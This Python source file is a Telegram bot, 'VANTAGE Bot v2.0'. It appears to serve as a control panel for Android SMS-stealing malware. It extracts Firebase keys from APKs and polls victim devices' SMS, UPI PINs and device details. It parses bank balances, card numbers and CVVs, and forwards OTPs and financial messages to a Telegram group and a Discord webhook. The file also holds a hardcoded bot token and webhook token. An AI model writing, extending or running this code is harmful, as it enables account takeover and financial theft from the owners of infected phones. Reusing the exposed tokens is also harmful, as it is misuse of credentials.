#!/usr/bin/env python3
"""
VANTAGE Bot v2.0 - Fixed + Advanced Features
- Flood control fix
- Multi Firebase support
- Full numbers (no mask)
- Real-time SMS only (no old)
- Luxury group messages
- Advanced admin panel
"""

import os
import io
import json
import time
import base64
import re
import asyncio
import logging
import zipfile
from datetime import datetime
from typing import Optional, Dict, List, Any

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode
from telegram.error import RetryAfter, TelegramError

# ============================================
# CONFIGURATION
# ============================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAGCrtYCTLNUswtJgN9fatmpAyUZ44VqM30")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",") if x.strip()]

SMS_GROUP_LINK = os.getenv("SMS_GROUP_LINK", "https://t.me/fire_x_otp_group")
SMS_GROUP_ID = os.getenv("SMS_GROUP_ID", "-1003870313704")
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "https://t.me/THE_FIRE_X_NUMBER_CHANNEL")

DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1549467602516967585/E-22gt7Ud9ly_DL2xeqa0weVki7f1vxlwmr7xAjUiUP-ENc0hozEj8xUs6ULe5h_6kZS",
]

DATA_FILE = "vantage_bot_data.json"
POLL_INTERVAL = 5       # seconds between polls per account
SEND_DELAY = 1.2        # seconds between group sends (avoid flood)
MAX_SEND_RETRY = 3

# States
(MAIN_MENU, ADD_URL, ADD_KEY, SEND_NUM, SEND_MSG,
 BC_TO, BC_MSG, BC_COUNT, LOCK_REASON, USER_ID_INPUT) = range(10)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)  # silence httpx noise
logger = logging.getLogger(__name__)

# Global flood control
_send_lock = asyncio.Lock()
_last_send_time = 0


# ============================================
# STORAGE
# ============================================
def load_data() -> Dict:
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
                # Migrations
                d.setdefault("accounts", {})
                d.setdefault("user_sessions", {})
                d.setdefault("locked_users", {})
                d.setdefault("bot_locked", False)
                d.setdefault("seen_msgs", {})
                d.setdefault("broadcasts_sent", 0)
                d.setdefault("user_registry", {})  # uid -> {username, first_seen}
                return d
        except Exception:
            pass
    return {
        "accounts": {}, "user_sessions": {}, "locked_users": {},
        "bot_locked": False, "seen_msgs": {}, "broadcasts_sent": 0,
        "user_registry": {},
    }


def save_data(data: Dict):
    try:
        tmp = DATA_FILE + ".tmp"
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except Exception as e:
        logger.error(f"Save error: {e}")


DB = load_data()


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def is_locked(uid: int) -> bool:
    if DB.get("bot_locked") and not is_admin(uid):
        return True
    return str(uid) in DB.get("locked_users", {})


def register_user(uid: int, username: str, name: str):
    reg = DB.setdefault("user_registry", {})
    if str(uid) not in reg:
        reg[str(uid)] = {
            "username": username or "",
            "name": name or "",
            "first_seen": datetime.now().isoformat(),
        }
        save_data(DB)


# ============================================
# FIREBASE
# ============================================
async def fb_get(url: str, key: str, path: str, params: Dict = None) -> Optional[Any]:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    query = {"auth": key.strip(), "_cb": str(int(time.time() * 1000))}
    if params:
        query.update(params)
    qs = '&'.join(f"{k}={v}" for k, v in query.items())
    full = f"{base}/{path}.json?{qs}" if path else f"{base}/.json?{qs}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(full, headers={"Accept": "application/json"}) as r:
                if r.status == 404:
                    return None
                if r.status in (401, 403):
                    raise Exception("PERMISSION_DENIED")
                if not r.ok:
                    t = await r.text()
                    raise Exception(f"HTTP {r.status}: {t[:120]}")
                return await r.json()
    except asyncio.TimeoutError:
        raise Exception("Timeout")
    except aiohttp.ClientError as e:
        raise Exception(f"Network: {e}")


async def fb_put(url: str, key: str, path: str, data: Any) -> bool:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    full = f"{base}/{path}.json?auth={key.strip()}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.put(full, json=data, headers={"Content-Type": "application/json"}) as r:
                return r.ok
    except Exception:
        return False


async def fb_delete(url: str, key: str, path: str) -> bool:
    base = url.strip().rstrip('/')
    if not base.startswith('http'):
        base = 'https://' + base
    full = f"{base}/{path}.json?auth={key.strip()}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.delete(full) as r:
                return r.ok
    except Exception:
        return False


# ============================================
# PARSERS
# ============================================
BANK_PATTERNS = [
    (r'HDFCBK|HDFCBANK|HDFC', 'HDFC Bank'), (r'SBIIN|SBIINB|SBI', 'SBI'),
    (r'ICICIB|ICICI', 'ICICI Bank'), (r'AXISBK|AXISBANK|AXIS', 'Axis Bank'),
    (r'KOTAKB|KOTAK', 'Kotak'), (r'PNBSMS|PNB', 'PNB'),
    (r'BOIIND|BOI', 'BOI'), (r'CANBNK|CANARA', 'Canara'),
    (r'UNIONB|UBISMS', 'Union'), (r'YESBNK|YESBANK', 'Yes Bank'),
    (r'IDBIBK|IDBI', 'IDBI'), (r'INDUSB|INDUSIND', 'IndusInd'),
    (r'FEDERAL|FEDBNK', 'Federal'), (r'RBLBNK|RBL', 'RBL'),
    (r'PAYTM', 'Paytm'), (r'PHONEPE|PHNPE', 'PhonePe'),
    (r'GPAY|GOOGLEPAY', 'GPay'), (r'AMAZONPAY', 'AmazonPay'),
    (r'BAJAJFIN', 'Bajaj'), (r'CRED', 'CRED'),
    (r'AIRTEL', 'Airtel'), (r'JIOMNY|JIOMONEY', 'JioMoney'),
]

BALANCE_PATTERNS = [
    r'Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)',
    r'Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)',
    r'Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)',
    r'Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)',
]

AMOUNT_PATTERNS = [
    r'(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)',
    r'(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)',
]

ACCOUNT_PATTERNS = [
    r'(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})',
    r'[xX*]{4,}([0-9]{4})', r'ending\s+(?:with\s+)?([0-9]{4})',
]

CARD_PATTERNS = [
    r'(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})',
    r'card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})',
]
CVV_PATTERNS = [r'CVV[\s:]+([0-9]{3,4})', r'(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})']
EXPIRY_PATTERNS = [r'(?:expiry|exp|valid\s+thru?)[\s:]+([0-9]{1,2}\/[0-9]{2,4})']

PHONE_PATTERNS = [
    r'(?:Jio|JIO)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'(?:Airtel|AIRTEL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})',
    r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})',
    r'(\+91[-\s]?[6-9][0-9]{9})',
    r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)',
]

NETWORK_PATTERNS = [
    (r'\bJio\b', 'Jio'), (r'\bAirtel\b', 'Airtel'), (r'\bBSNL\b', 'BSNL'),
    (r'\bVodafone\b', 'Vodafone'), (r'\b(?:Idea|Vi)\b', 'Vi'),
    (r'\bMTNL\b', 'MTNL'), (r'\bDocomo\b', 'Docomo'),
]


def detect_bank(sender: str) -> str:
    for pat, name in BANK_PATTERNS:
        if re.search(pat, sender, re.I):
            return name
    return "Bank"


def parse_bank_sms(text: str, sender: str) -> Optional[Dict]:
    if not text or len(text.strip()) < 8:
        return None
    upper = text.upper()
    if not re.search(r'AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE', upper):
        return None
    balance = None
    for p in BALANCE_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            try:
                balance = float(m.group(1).replace(',', ''))
                break
            except Exception:
                pass
    if balance is None:
        return None
    amount = None
    for p in AMOUNT_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            try:
                amount = float(m.group(1).replace(',', ''))
                break
            except Exception:
                pass
    ttype = None
    if re.search(r'credit(?:ed)?', text, re.I):
        ttype = 'credit'
    elif re.search(r'debit(?:ed)?|withdraw|paid|purchase|spent', text, re.I):
        ttype = 'debit'
    acc = None
    for p in ACCOUNT_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            acc = re.sub(r'[^0-9]', '', m.group(1))[-4:]
            break
    return {
        'bankName': detect_bank(sender),
        'senderName': sender,
        'availableBalance': balance,
        'transactionAmount': amount,
        'transactionType': ttype,
        'accountLast4': acc,
        'rawSms': text,
        'detectedAt': datetime.now().isoformat(),
    }


def parse_card_sms(text: str) -> Optional[Dict]:
    if not text:
        return None
    upper = text.upper()
    if not any(k in upper for k in ['CARD', 'CVV', 'CREDIT', 'DEBIT']):
        return None
    last4 = None
    for p in CARD_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            d = re.sub(r'[^0-9]', '', m.group(1))
            if len(d) >= 4:
                last4 = d[-4:]
                break
    if not last4:
        return None
    ctype = ''
    if re.search(r'VISA', text, re.I): ctype = 'VISA'
    elif re.search(r'MASTER', text, re.I): ctype = 'Mastercard'
    elif re.search(r'RUPAY', text, re.I): ctype = 'RuPay'
    elif re.search(r'AMEX', text, re.I): ctype = 'Amex'
    elif re.search(r'credit', text, re.I): ctype = 'Credit Card'
    elif re.search(r'debit', text, re.I): ctype = 'Debit Card'
    cvv = None
    for p in CVV_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            cvv = m.group(1)
            break
    exp = None
    for p in EXPIRY_PATTERNS:
        m = re.search(p, text, re.I)
        if m and m.group(1):
            exp = m.group(1)
            break
    return {'cardLast4': last4, 'cardType': ctype, 'cvv': cvv, 'expiry': exp, 'rawSms': text}


def extract_phones(text: str) -> List[str]:
    found = []
    for p in PHONE_PATTERNS:
        for m in re.finditer(p, text):
            d = re.sub(r'[^0-9]', '', m.group(1))
            if len(d) == 10 and d[0] in '6789':
                found.append(d)
            elif len(d) == 12 and d.startswith('91'):
                found.append(d[2:])
    return list(dict.fromkeys(found))


def extract_networks(text: str, sender: str) -> List[str]:
    nets = []
    for p, name in NETWORK_PATTERNS:
        if re.search(p, text + ' ' + sender, re.I):
            nets.append(name)
    return list(dict.fromkeys(nets))


def parse_messages(raw: Dict) -> List[Dict]:
    msgs = []
    if not raw or not isinstance(raw, dict):
        return msgs
    items = list(raw.items())
    if len(items) > 200:
        items = items[-200:]
    for key, m in items:
        if not isinstance(m, dict):
            continue
        text = str(m.get('message') or m.get('body') or m.get('text') or '')
        if not text.strip():
            continue
        msgs.append({
            'key': key,
            'text': text,
            'sender': str(m.get('sender') or m.get('from') or 'Unknown'),
            'time': str(m.get('dateTime') or m.get('date') or ''),
        })
    msgs.reverse()
    return msgs


def parse_devices(raw: Dict) -> List[Dict]:
    devices = []
    if not raw or not isinstance(raw, dict):
        return devices
    for dev_id, d in raw.items():
        if not isinstance(d, dict):
            continue
        sims = d.get('sims', [])
        if isinstance(sims, dict):
            sims = list(sims.values())
        elif not isinstance(sims, list):
            sims = []
        battery = str(d.get('battery', '—'))
        try:
            bpct = int(re.sub(r'[^0-9]', '', battery) or '0')
        except Exception:
            bpct = 0
        devices.append({
            'id': dev_id,
            'name': str(d.get('modelName') or d.get('model') or d.get('deviceName') or dev_id),
            'battery': battery,
            'batteryPercent': bpct,
            'status': bool(d.get('status')),
            'phoneNumber': str(d.get('mobNo') or (sims[0].get('phoneNumber') if sims and isinstance(sims[0], dict) else '—')),
            'android': str(d.get('androidV') or d.get('androidVersion') or '—'),
            'ip': str(d.get('ip_address') or '—'),
            'storage': str(d.get('storage') or '—'),
            'provider': str(d.get('service_provider') or '—'),
            'sims': sims,
            'upipin': str(d['upipin']) if d.get('upipin') else None,
            'cpu': str(d.get('cpu_arch') or '—'),
            'sdk': str(d.get('sdkV') or '—'),
        })
    return devices


# ============================================
# APK PARSER
# ============================================
async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
    try:
        firebase_url = None
        api_key = None
        project_id = None
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for name in zf.namelist():
                if 'google-services.json' in name:
                    try:
                        data = json.loads(zf.read(name).decode('utf-8', errors='ignore'))
                        firebase_url = data.get('project_info', {}).get('firebase_url')
                        project_id = data.get('project_info', {}).get('project_id')
                        clients = data.get('client', [])
                        if clients:
                            api_key = clients[0].get('api_key', [{}])[0].get('current_key')
                        if firebase_url:
                            break
                    except Exception:
                        pass
            if not firebase_url or not api_key:
                for name in zf.namelist():
                    if name.endswith('.dex') or name == 'resources.arsc':
                        try:
                            text = zf.read(name).decode('latin-1', errors='ignore')
                            if not firebase_url:
                                m = re.search(r'https://[a-z0-9_-]+\.firebaseio\.com', text)
                                if m:
                                    firebase_url = m.group(0)
                            if not api_key:
                                m = re.search(r'AIza[A-Za-z0-9_-]{35}', text)
                                if m:
                                    api_key = m.group(0)
                            if firebase_url and api_key:
                                break
                        except Exception:
                            pass
        if firebase_url or api_key:
            return {'firebaseUrl': firebase_url, 'apiKey': api_key, 'projectId': project_id}
    except Exception as e:
        logger.error(f"APK: {e}")
    return None


# ============================================
# FLOOD-SAFE SEND
# ============================================
async def safe_send(app: Application, chat_id, text: str, **kwargs):
    global _last_send_time
    async with _send_lock:
        elapsed = time.time() - _last_send_time
        if elapsed < SEND_DELAY:
            await asyncio.sleep(SEND_DELAY - elapsed)
        
        for attempt in range(MAX_SEND_RETRY):
            try:
                msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
                _last_send_time = time.time()
                return msg
            except RetryAfter as e:
                wait = int(e.retry_after) + 1
                logger.warning(f"Rate limit — waiting {wait}s")
                await asyncio.sleep(wait)
            except TelegramError as e:
                err = str(e)
                if "parse entities" in err or "Can't parse" in err:
                    logger.warning("Markdown failed — retrying plain")
                    kwargs.pop('parse_mode', None)
                    try:
                        msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
                        _last_send_time = time.time()
                        return msg
                    except Exception as e2:
                        logger.error(f"Plain retry failed: {e2}")
                        return None
                logger.error(f"Send failed: {e}")
                if attempt == MAX_SEND_RETRY - 1:
                    return None
                await asyncio.sleep(2)
        return None


# ============================================
# DISCORD
# ============================================
async def send_discord(url: str, key: str, username: str = "Unknown"):
    try:
        total = 0
        online = 0
        try:
            stats = await fb_get(url, key, "clients")
            if stats and isinstance(stats, dict):
                c = list(stats.values())
                total = len(c)
                online = sum(1 for x in c if isinstance(x, dict) and x.get('status') is True)
        except Exception:
            pass
        embed = {"embeds": [{
            "title": "🔗 New Firebase Connection",
            "color": 0x5865F2,
            "fields": [
                {"name": "📡 URL", "value": url[:100], "inline": False},
                {"name": "👤 User", "value": username, "inline": True},
                {"name": "📊 Total", "value": str(total), "inline": True},
                {"name": "🟢 Online", "value": str(online), "inline": True},
            ],
            "footer": {"text": "VANTAGE"},
            "timestamp": datetime.now().isoformat(),
        }]}
        async with aiohttp.ClientSession() as s:
            for wh in DISCORD_WEBHOOKS:
                try:
                    async with s.post(wh, json=embed) as r:
                        await r.text()
                except Exception:
                    pass
    except Exception as e:
        logger.error(f"Discord: {e}")


# ============================================
# ACCOUNT HELPERS
# ============================================
def get_accounts(uid: int) -> List[Dict]:
    return DB.get('accounts', {}).get(str(uid), [])


def save_accounts(uid: int, accs: List[Dict]):
    DB.setdefault('accounts', {})[str(uid)] = accs
    save_data(DB)


def get_current(uid: int) -> Optional[Dict]:
    sess = DB.get('user_sessions', {}).get(str(uid))
    if not sess:
        return None
    for a in get_accounts(uid):
        if a.get('id') == sess.get('account_id'):
            return a
    return None


def set_current(uid: int, acc_id: Optional[int]):
    DB.setdefault('user_sessions', {})[str(uid)] = {'account_id': acc_id}
    save_data(DB)


# ============================================
# FETCH HELPERS
# ============================================
async def fetch_devices_and_msgs(acc: Dict, only_online=True) -> List[Dict]:
    """Fetch devices + their latest messages"""
    result = []
    try:
        raw = await fb_get(acc['url'], acc['key'], "clients")
        devices = parse_devices(raw)
        for dev in devices:
            if only_online and not dev['status']:
                continue
            try:
                raw_msgs = await fb_get(
                    acc['url'], acc['key'],
                    f"messages/{dev['id']}",
                    {"orderBy": '"$key"', "limitToLast": "30"}
                )
                dev['messages'] = parse_messages(raw_msgs)
            except Exception:
                dev['messages'] = []
            result.append(dev)
    except Exception as e:
        logger.error(f"Fetch error: {e}")
    return result


async def fetch_all_online_devices(uid: int) -> List[Dict]:
    """Fetch from ALL admin accounts"""
    all_devs = []
    for acc in get_accounts(uid):
        try:
            devs = await fetch_devices_and_msgs(acc, only_online=True)
            for d in devs:
                d['_account'] = acc['url']
                d['_acc_id'] = acc['id']
            all_devs.extend(devs)
        except Exception:
            pass
    return all_devs


async def fetch_all_numbers(uid: int) -> List[Dict]:
    """Fetch ALL numbers from ALL online devices with metadata"""
    numbers = {}
    devs = await fetch_all_online_devices(uid)
    for d in devs:
        if d['phoneNumber'] and d['phoneNumber'] != '—':
            num = re.sub(r'[^0-9]', '', d['phoneNumber'])
            if len(num) >= 10:
                numbers[num[-10:]] = {
                    'number': num[-10:],
                    'device': d['name'],
                    'device_id': d['id'],
                    'provider': d['provider'],
                    'battery': d['battery'],
                }
        for m in d.get('messages', []):
            for p in extract_phones(m['text']):
                if p not in numbers:
                    numbers[p] = {
                        'number': p,
                        'device': d['name'],
                        'device_id': d['id'],
                        'provider': d['provider'],
                        'battery': d['battery'],
                    }
    return sorted(numbers.values(), key=lambda x: x['number'])


# ============================================
# SMS FORWARDER (Real-time only, no old)
# ============================================
FORWARDER_RUNNING = False


async def forward_loop(app: Application):
    """Poll all accounts, forward only NEW messages"""
    global FORWARDER_RUNNING
    FORWARDER_RUNNING = True
    logger.info("📡 SMS Forwarder started")
    
    # On startup, mark all existing messages as "seen" without forwarding
    # This prevents old messages from being sent
    await initial_sync(app)
    
    while FORWARDER_RUNNING:
        try:
            all_accounts = DB.get('accounts', {})
            for uid_str, accs in list(all_accounts.items()):
                for acc in accs:
                    try:
                        devices = await fetch_devices_and_msgs(acc, only_online=True)
                        for dev in devices:
                            acc_id = f"{acc['url']}|{dev['id']}"
                            seen = DB.get('seen_msgs', {})
                            last_seen_key = seen.get(acc_id)
                            
                            new_msgs = []
                            for m in dev.get('messages', []):
                                if last_seen_key and m['key'] <= last_seen_key:
                                    continue
                                if not last_seen_key:
                                    # First time seeing this device — mark all as seen, don't forward
                                    continue
                                new_msgs.append(m)
                            
                            if dev.get('messages'):
                                seen[acc_id] = dev['messages'][-1]['key']
                                DB['seen_msgs'] = seen
                            
                            for m in new_msgs:
                                await forward_sms_to_group(app, dev, m)
                                await asyncio.sleep(0.5)
                        
                        save_data(DB)
                    except Exception as e:
                        logger.error(f"Forward: {e}")
                    await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Loop: {e}")
        await asyncio.sleep(POLL_INTERVAL)


async def initial_sync(app: Application):
    """Mark existing messages as seen so we don't flood group with old SMS"""
    logger.info("🔄 Initial sync — marking existing messages as seen...")
    all_accounts = DB.get('accounts', {})
    seen = DB.get('seen_msgs', {})
    
    for uid_str, accs in all_accounts.items():
        for acc in accs:
            try:
                devices = await fetch_devices_and_msgs(acc, only_online=True)
                for dev in devices:
                    acc_id = f"{acc['url']}|{dev['id']}"
                    if dev.get('messages'):
                        seen[acc_id] = dev['messages'][-1]['key']
            except Exception:
                pass
    
    DB['seen_msgs'] = seen
    save_data(DB)
    logger.info("✅ Initial sync complete")


def escape_md(text: str) -> str:
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '=', '|', '{', '}', '.', '!']:
        text = text.replace(ch, '\\' + ch)
    return text


def build_luxury_sms(dev: Dict, msg: Dict) -> str:
    sender = msg.get('sender', 'Unknown')
    text = msg.get('text', '')
    time_str = msg.get('time', '')
    
    phone = dev['phoneNumber']
    if not phone or phone == '—':
        phones = extract_phones(text)
        phone = phones[0] if phones else '—'
    
    bank = parse_bank_sms(text, sender)
    card = parse_card_sms(text)
    
    if card:
        icon, category = "💳", "CARD"
    elif bank:
        icon, category = "🏦", "BANK"
    else:
        icon, category = "📩", "SMS"
    
    lines = [
        f"╔══════════════════════",
        f"║ {icon} **{category} MESSAGE**",
        f"╠══════════════════════",
        f"║ 📱 **Device:** {escape_md(dev['name'][:25])}",
        f"║ 📞 **Number:** `{phone}`",
        f"║ 👤 **From:** `{escape_md(sender)}`",
    ]
    if time_str:
        lines.append(f"║ ⏰ **Time:** {escape_md(time_str)}")
    if dev.get('provider'):
        lines.append(f"║ 🌐 **Network:** {escape_md(dev['provider'])}")
    if dev.get('battery'):
        lines.append(f"║ 🔋 **Battery:** {dev['battery']}")
    
    lines.append("╠══════════════════════")
    lines.append(f"║ 💬 **Message:**")
    lines.append(f"║")
    
    for line in text[:3500].split('\n'):
        lines.append(f"║ {escape_md(line)}")
    
    if bank:
        lines.append("╠══════════════════════")
        lines.append(f"║ 💰 **Balance:** ₹{bank['availableBalance']:,.2f}")
        if bank.get('transactionAmount'):
            sign = "＋" if bank['transactionType'] == 'credit' else "－"
            lines.append(f"║ {sign} **Amount:** ₹{bank['transactionAmount']:,.2f}")
            lines.append(f"║ 📊 **Type:** {bank['transactionType'].upper()}")
        if bank.get('accountLast4'):
            lines.append(f"║ 🔢 **A/C:** ****{bank['accountLast4']}")
    
    if card:
        lines.append("╠══════════════════════")
        lines.append(f"║ 💳 **Card:** {card['cardType'] or 'Unknown'}")
        lines.append(f"║ 🔢 **Number:** **** **** **** {card['cardLast4']}")
        if card.get('cvv'):
            lines.append(f"║ 🔐 **CVV:** `{card['cvv']}`")
        if card.get('expiry'):
            lines.append(f"║ 📅 **Expiry:** {card['expiry']}")
    
    lines.append("╚══════════════════════")
    return "\n".join(lines)

async def forward_sms_to_group(app: Application, dev: Dict, msg: Dict):
    """Forward ONE new SMS with luxury UI"""
    try:
        body = build_luxury_sms(dev, msg)
        
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
            InlineKeyboardButton("👥 SMS Group", url=SMS_GROUP_LINK),
        ]])
        
        await safe_send(
            app, SMS_GROUP_ID, body,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"Forward error: {e}")


# ============================================
# UI BUILDERS
# ============================================
async def build_admin_menu(uid: int):
    accounts = get_accounts(uid)
    current = get_current(uid)
    
    total_online = 0
    total_numbers = 0
    try:
        devs = await fetch_all_online_devices(uid)
        total_online = len(devs)
        nums = await fetch_all_numbers(uid)
        total_numbers = len(nums)
    except Exception:
        pass
    
    bot_locked = DB.get('bot_locked', False)
    locked_count = len(DB.get('locked_users', {}))
    total_users = len(DB.get('user_registry', {}))
    
    text = (
        f"👑 **VANTAGE ADMIN PANEL**\n\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📡 Accounts: **{len(accounts)}**\n"
        f"🟢 Online Devices: **{total_online}**\n"
        f"📞 Total Numbers: **{total_numbers}**\n"
        f"👥 Total Users: **{total_users}**\n"
        f"🔒 Locked Users: **{locked_count}**\n"
        f"🤖 Bot Status: {'🔴 LOCKED' if bot_locked else '🟢 Active'}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    if current:
        text += f"\n✅ Current: `{current['url'][:40]}`"
    
    kb = []
    if current:
        kb.append([InlineKeyboardButton("📱 Online Devices", callback_data="admin_devices"),
                   InlineKeyboardButton("📞 All Numbers", callback_data="admin_numbers")])
        kb.append([InlineKeyboardButton("🏦 Bank Info", callback_data="admin_bank"),
                   InlineKeyboardButton("💳 Cards", callback_data="admin_cards")])
        kb.append([InlineKeyboardButton("📤 Send SMS", callback_data="admin_send"),
                   InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")])
    
    kb.append([InlineKeyboardButton("➕ Add Account", callback_data="add_account"),
               InlineKeyboardButton("📁 My Accounts", callback_data="admin_accounts")])
    
    kb.append([InlineKeyboardButton(
        "🔓 Unlock Bot" if bot_locked else "🔒 Lock Bot",
        callback_data="toggle_lock"
    )])
    
    kb.append([InlineKeyboardButton("👥 User Management", callback_data="admin_users")])
    kb.append([InlineKeyboardButton("📤 Export All Numbers", callback_data="admin_export")])
    kb.append([InlineKeyboardButton("🗑 Remove Firebase", callback_data="admin_remove_fb")])
    kb.append([InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
               InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
    
    return text, InlineKeyboardMarkup(kb)


async def build_user_menu(uid: int):
    accounts = get_accounts(uid)
    current = get_current(uid)
    
    if not current and accounts:
        set_current(uid, accounts[0]['id'])
        current = accounts[0]
    
    if not current:
        return (
            "❌ **No account connected**\n\nContact admin for access.",
            InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]])
        )
    
    try:
        devs = await fetch_devices_and_msgs(current, only_online=True)
        numbers = await fetch_all_numbers(uid)
        
        text = (
            f"📱 **VANTAGE**\n\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 Online Devices: **{len(devs)}**\n"
            f"📞 Total Numbers: **{len(numbers)}**\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
        )
        
        if numbers:
            text += "📋 **Available Numbers:**\n\n"
            for i, n in enumerate(numbers[:50], 1):
                text += f"`{i}.` **{n['number']}**\n"
            if len(numbers) > 50:
                text += f"\n_...and {len(numbers) - 50} more_"
        else:
            text += "_No numbers available_"
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
            [InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
             InlineKeyboardButton("👥 SMS Group", url=SMS_GROUP_LINK)],
        ])
        return text, kb
    except Exception as e:
        return (f"❌ Error: {e}", InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data="refresh")]]))


async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if is_locked(uid):
        reason = DB.get('locked_users', {}).get(str(uid), {}).get('reason', 'Access denied')
        msg = f"🔒 **Access Denied**\n\n{reason}\n\nContact admin."
        if update.message:
            await update.message.reply_text(msg, parse_mode='Markdown')
        else:
            await update.callback_query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    if is_admin(uid):
        text, kb = await build_admin_menu(uid)
    else:
        text, kb = await build_user_menu(uid)
    
    if update.message:
        await update.message.reply_text(text, reply_markup=kb, parse_mode='Markdown')
    else:
        try:
            await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='Markdown')
        except Exception:
            await update.callback_query.message.reply_text(text, reply_markup=kb, parse_mode='Markdown')


# ============================================
# COMMANDS
# ============================================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    register_user(uid, update.effective_user.username, update.effective_user.full_name)
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_admin(update.effective_user.id):
        text = (
            "👑 **Admin Commands**\n\n"
            "/start — Admin panel\n"
            "/lock — Lock bot globally\n"
            "/unlock — Unlock bot\n"
            "/lockuser `<id>` [reason] — Lock user\n"
            "/unlockuser `<id>` — Unlock user\n"
            "/stats — Bot statistics\n"
            "/users — List all users\n"
            "/cancel — Cancel\n"
        )
    else:
        text = "🤖 **VANTAGE Bot**\n\n/start — Main menu\n/refresh — Refresh numbers"
    await update.message.reply_text(text, parse_mode='Markdown')


async def cmd_lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    DB['bot_locked'] = True
    save_data(DB)
    await update.message.reply_text("🔒 Bot LOCKED globally.")


async def cmd_unlock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    DB['bot_locked'] = False
    save_data(DB)
    await update.message.reply_text("🔓 Bot UNLOCKED.")


